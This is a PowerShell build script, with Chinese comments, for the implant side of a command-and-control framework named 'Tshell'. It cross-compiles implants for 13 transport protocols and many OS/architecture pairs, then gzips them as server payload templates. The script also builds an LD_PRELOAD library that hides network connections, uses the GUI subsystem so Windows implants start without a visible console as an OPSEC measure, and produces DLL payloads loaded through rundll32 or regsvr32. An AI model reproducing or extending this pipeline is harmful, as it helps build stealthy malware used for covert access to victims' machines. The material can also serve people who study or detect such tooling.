# build_templates.ps1
# 编译统一 implant 模块（单二进制 cmd/single，build tag 选择传输协议）。
# 12 个协议（http/https/kcp/oss/tcp/websocket/tcp_forward/kcp_forward/ws_forward/
# http_forward/https_forward/dns），交叉编译各 OS/架构，直接放置到服务端模板目录
# Tshell-server\pkg\api\server\{proto}\，供服务端 GenServer 二进制 patch 管线使用。
# 与 build_templates.sh 功能对齐（12 adapter + DLL 载荷 + 相同 OS/架构矩阵 + hide_net 预编译库）。
#
# 体积优化：构建使用 -s -w -trimpath -buildvcs=false，并在构建后对模板 gzip 压缩
# （服务端 embed 时只携带压缩数据，二进制体积降至约 1/3；GenServer/WebDelivery
# 读取时按 gzip 魔数自动解压再 patch）。
#
# 用法： pwsh -ExecutionPolicy Bypass -File build_templates.ps1（powershell 5.1 需文件带 UTF-8 BOM，已加）
# 失败的架构（如 darwin 缺桩函数）保留旧二进制，不覆盖。
# OPSEC：Windows EXE 使用 GUI 子系统(-H windowsgui)，启动无控制台窗口闪烁
#（HideConsole 运行时二次隐藏）。

$ErrorActionPreference = "Continue"
$ScriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path $MyInvocation.MyCommand.Path }
Set-Location $ScriptDir  # implant 模块根

$ServerTemplates = (Resolve-Path (Join-Path $ScriptDir "..\..\Tshell-server\pkg\api\server")).Path

# gzip 压缩模板（就地覆盖同名文件；服务端按 gzip 魔数自动解压）
function Gzip-InPlace([string]$path) {
    $in = [System.IO.File]::OpenRead($path)
    $tmp = "$path.tmpgz"
    $out = [System.IO.File]::Create($tmp)
    $gz = New-Object System.IO.Compression.GZipStream($out, [System.IO.Compression.CompressionLevel]::Optimal)
    $in.CopyTo($gz)
    $gz.Close(); $out.Close(); $in.Close()
    Move-Item -Force $tmp $path
}

# ============ 预编译隐藏库（hide_net.c，LD_PRELOAD 网络连接隐藏）============
# 由宿主机 gcc 编译并嵌入植入体（go:embed core/commands/hide_preload/so/）。
# 仅宿主机架构；其他架构的植入体运行 hidenet 时提示无预编译库。
# 注：Windows 宿主的 mingw gcc 通常无法产出 Linux .so，尽力尝试并提示。
Write-Host "===== Building hide_net preload library ====="
$gcc = Get-Command gcc -ErrorAction SilentlyContinue
if ($null -ne $gcc) {
    $hideDir = Join-Path $ScriptDir "core\commands\hide_preload\so"
    if (-not (Test-Path $hideDir)) { New-Item -ItemType Directory -Path $hideDir -Force | Out-Null }
    # 宿主机架构（Windows x64 → amd64；ARM64 → arm64）
    $hostArch = $env:PROCESSOR_ARCHITECTURE
    $hostGoarch = switch ($hostArch) {
        "AMD64" { "amd64" }
        "ARM64" { "arm64" }
        "X86"   { "386" }
        default { "unknown" }
    }
    if ($hostGoarch -ne "unknown") {
        $out = Join-Path $hideDir "hide_net_linux_${hostGoarch}.so"
        $cfile = Join-Path $ScriptDir "core\commands\hide_preload\hide_net.c"
        & gcc -shared -fPIC -O2 -o $out $cfile -ldl 2>"$env:TEMP\hide_build_err.txt"
        if ($LASTEXITCODE -eq 0) {
            Write-Host "OK   hide_net_linux_${hostGoarch}.so -> $out"
        } else {
            $errMsg = if (Test-Path "$env:TEMP\hide_build_err.txt") { (Get-Content "$env:TEMP\hide_build_err.txt" -TotalCount 1) } else { "" }
            Write-Host "FAIL hide_net build: $errMsg (Windows 宿主 mingw 无法产出 Linux .so 属预期)"
        }
    } else {
        Write-Host "WARN: 未知宿主机架构 $hostArch，跳过 hide_net 预编译库"
    }
} else {
    Write-Host "WARN: gcc not found - skipping hide_net preload library"
}

# proto : filename prefix (websocket uses ws_)
$Protos = @(
    @{ proto="http";        prefix="http" },
    @{ proto="https";       prefix="https" },
    @{ proto="kcp";         prefix="kcp" },
    @{ proto="oss";         prefix="oss" },
    @{ proto="tcp";         prefix="tcp" },
    @{ proto="websocket";   prefix="ws" },
    @{ proto="tcp_forward"; prefix="tcp_forward" },
    @{ proto="kcp_forward"; prefix="kcp_forward" },
    @{ proto="ws_forward";  prefix="ws_forward" },
    @{ proto="http_forward";  prefix="http_forward" },
    @{ proto="https_forward"; prefix="https_forward" },
    @{ proto="dns";         prefix="dns" },
    # multi：13 个 build tag 全编入的"一把梭"载荷（transport_multi）。
    # 它单独占 14 个 EXE + 2 个 DLL，原先漏在这个列表外 ——
    # 结果是每次重建都留下 16 个旧产物（服务端照样能用，但代码是旧的），
    # 而且不会报错，属于"静默不更新"，所以必须列入。
    @{ proto="multi";       prefix="multi" }
)

# OS/架构对（服务端模板集；与 sh 的 ARCHES 完全一致：darwin amd64/arm64，
# linux 9 架构含 mips*/loong64，windows 386/amd64/arm64）
$Arches = @(
    @("darwin","amd64"), @("darwin","arm64"),
    @("linux","386"), @("linux","amd64"), @("linux","arm"), @("linux","arm64"),
    @("linux","loong64"), @("linux","mips"), @("linux","mips64"), @("linux","mips64le"), @("linux","mipsle"),
    @("windows","386"), @("windows","amd64"), @("windows","arm64")
)

# 保存环境变量，结束恢复
$origGOOS = $env:GOOS; $origGOARCH = $env:GOARCH; $origCGO = $env:CGO_ENABLED
$env:CGO_ENABLED = "0"
$errFile = Join-Path $env:TEMP "implant_build_err.txt"

$ok = 0; $fail = 0
foreach ($p in $Protos) {
    $proto = $p.proto; $prefix = $p.prefix
    foreach ($a in $Arches) {
        $goos = $a[0]; $goarch = $a[1]
        # tcp_forward 无 darwin 模板
        if ($proto -eq "tcp_forward" -and $goos -eq "darwin") { continue }
        $ext = if ($goos -eq "windows") { ".exe" } else { "" }
        $outDir = Join-Path $ServerTemplates $proto
        if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir -Force | Out-Null }
        $out = Join-Path $outDir ("{0}_{1}_{2}{3}" -f $prefix, $goos, $goarch, $ext)
        $env:GOOS = $goos; $env:GOARCH = $goarch
        # 【重建修复】构建到临时文件再原子覆盖：模板已是 gzip 内容，
        # go build 拒绝直接覆盖"非对象文件"→ 旧模板永不更新。失败保留旧模板。
        $tmpOut = "$out.new"
        Remove-Item $tmpOut -ErrorAction SilentlyContinue
        # OPSEC: Windows EXE 使用 GUI 子系统(-H windowsgui)，启动无控制台窗口闪烁
        $ldflags = "-s -w"
        if ($goos -eq "windows") { $ldflags = "$ldflags -H windowsgui" }
        & go build -buildvcs=false -tags "transport_$proto" -ldflags $ldflags -trimpath -o $tmpOut "./cmd/single" 2>$errFile
        if ($LASTEXITCODE -eq 0) {
            Gzip-InPlace $tmpOut
            Move-Item -Force $tmpOut $out
            Write-Host "OK   $proto $goos/$goarch -> $(Split-Path $out -Leaf) (gzip)"
            $ok++
        } else {
            Remove-Item $tmpOut -ErrorAction SilentlyContinue
            $errMsg = if (Test-Path $errFile) { (Get-Content $errFile -TotalCount 1) } else { "" }
            Write-Host "FAIL $proto $goos/$goarch (kept old): $errMsg"
            $fail++
        }
    }
}

# Restore env vars
$env:GOOS = $origGOOS; $env:GOARCH = $origGOARCH; $env:CGO_ENABLED = $origCGO
Remove-Item $errFile -ErrorAction SilentlyContinue

Write-Host "===== EXE OK=$ok FAIL=$fail ====="

# ============ DLL 载荷模板（rundll32/regsvr32 加载，-buildmode=c-shared）============
# 需要 CGO + C 编译器（优先 mingw-w64 交叉编译，回退 gcc），
# 仅产出 windows/386 + windows/amd64。无编译器时跳过并提示。
Write-Host ""
Write-Host "===== Building DLL templates (c-shared, needs gcc) ====="

$CCx86_64 = $null; $CC386 = $null
# 注意：必须分别确认 64/32 位工具链都存在。TDM-GCC-64 只带
# x86_64-w64-mingw32-gcc、没有 i686-w64-mingw32-gcc —— 之前只检查前者就
# 假定后者存在，导致所有 windows/386 DLL 静默保留旧产物。
if ((Get-Command x86_64-w64-mingw32-gcc -ErrorAction SilentlyContinue) -and
    (Get-Command i686-w64-mingw32-gcc -ErrorAction SilentlyContinue)) {
    $CCx86_64 = "x86_64-w64-mingw32-gcc"; $CC386 = "i686-w64-mingw32-gcc"
} elseif ($null -ne (Get-Command gcc -ErrorAction SilentlyContinue)) {
    # 回退到单套 gcc 时必须显式加 -m32：否则 GOARCH=386 仍用 64 位工具链，
    # c-shared 会在 runtime/cgo 处链接失败（原先 $CC386 = "gcc" 就是这个错误，
    # 表现为所有 windows/386 DLL 静默保留旧产物）。
    # TDM-GCC-64 这类发行版带 multilib，-m32 可用；纯 64 位发行版会在此失败，
    # 仍按原逻辑保留旧 DLL。
    $CCx86_64 = "gcc"; $CC386 = "gcc -m32"
} else {
    Write-Host "WARN: gcc not found - skipping DLL templates (install mingw-w64 to enable)"
}

if ($null -ne $CCx86_64) {
    $dllOk = 0; $dllFail = 0
    $env:CGO_ENABLED = "1"
    foreach ($p in $Protos) {
        $proto = $p.proto; $prefix = $p.prefix
        foreach ($pair in @(@("windows","amd64",$CCx86_64), @("windows","386",$CC386))) {
            $goos = $pair[0]; $goarch = $pair[1]; $cc = $pair[2]
            $outDir = Join-Path $ServerTemplates $proto
            if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir -Force | Out-Null }
            $out = Join-Path $outDir ("{0}_{1}_{2}.dll" -f $prefix, $goos, $goarch)
            $env:GOOS = $goos; $env:GOARCH = $goarch; $env:CC = $cc
            $tmpOut = "$out.new"
            Remove-Item $tmpOut -ErrorAction SilentlyContinue
            & go build -buildvcs=false -tags "transport_$proto dll" -buildmode=c-shared -ldflags "-s -w" -trimpath -o $tmpOut "./cmd/single" 2>$errFile
            if ($LASTEXITCODE -eq 0) {
                # 清理 c-shared 伴随生成的 .h 文件。
                # 注意：-buildmode=c-shared 对 -o x.dll 生成的头文件是 **x.dll.h**（不是 x.h），
                # 原来写成 -replace '\.dll\$','.h' 匹配不到，于是每次构建都在模板目录留下
                # 一堆 .h 副产物（会被 git status 看到、误提交进仓库）。
                Remove-Item ($out + '.h') -ErrorAction SilentlyContinue
                Gzip-InPlace $tmpOut
                Move-Item -Force $tmpOut $out
                Write-Host "OK   DLL $proto $goos/$goarch -> $(Split-Path $out -Leaf) (gzip)"
                $dllOk++
            } else {
                Remove-Item $tmpOut -ErrorAction SilentlyContinue
                $errMsg = if (Test-Path $errFile) { (Get-Content $errFile -TotalCount 1) } else { "" }
                Write-Host "FAIL DLL $proto $goos/$goarch (kept old): $errMsg"
                $dllFail++
            }
        }
    }
    $env:CGO_ENABLED = $origCGO
    Write-Host "===== DLL OK=$dllOk FAIL=$dllFail ====="
    Write-Host "Note: DLL templates need gcc; rundll32 payload.dll,Run / regsvr32 payload.dll"
}

# Restore env vars
$env:GOOS = $origGOOS; $env:GOARCH = $origGOARCH; $env:CGO_ENABLED = $origCGO
$env:CC = $null
Remove-Item $errFile -ErrorAction SilentlyContinue

Write-Host "注：tcp_forward 无 darwin 模板（跳过保留旧二进制）。"
